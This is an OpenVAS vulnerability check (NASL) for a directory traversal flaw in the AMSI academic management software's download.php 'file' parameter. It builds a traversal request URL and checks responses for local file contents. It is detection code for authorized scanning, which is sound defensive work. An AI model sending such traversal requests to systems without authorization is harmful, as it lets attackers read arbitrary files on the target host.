###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_amsi_file_param_dir_traversal_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# AMSI 'file' Parameter Directory Traversal Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805237");
  script_version("$Revision: 7577 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2015-01-12 16:30:44 +0530 (Mon, 12 Jan 2015)");
  script_name("AMSI 'file' Parameter Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Academia
  management solutions international (AMSI) and is prone to directory traversal
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read local file or not.");

  script_tag(name:"insight", value:"The error exists due to the download.php
  script, which does not properly sanitize user input supplied via the 'file'
  parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attackers to read arbitrary files on the target system.

  Impact Level: System/Application");

  script_tag(name:"affected", value:"AMSI v3.20.47 build 37 and probably other
  versions.");

  script_tag(name:"solution", value:"No solution or patch was made available
  for at least one year since disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/129714");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
http_port = 0;
url = "";
req = "";
res = "";
dir = "";

http_port = get_http_port(default:80);
if(!can_host_php(port:http_port)){
  exit(0);
}

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach dir (make_list_unique("/", "/amsi", "/AMSI", cgi_dirs(port:http_port)))
{

  if( dir == "/" ) dir = "";

  ##Application Confirmation and exploit Confirmation is done together
  foreach file (keys(files))
  {
    ## Construct directory traversal attack
    url = dir + "/download.php?file=" + files[file];

    ## Confirm application as well as exploit worked properly
    if(http_vuln_check(port:http_port, url:url, pattern:file,
       extra_check:make_list("amsi_web", "amsi_moodle")))
    {
      report = report_vuln_url( port:http_port, url:url );
      security_message(port:http_port, data:report);
      exit(0);
    }
  }
}

exit(99);
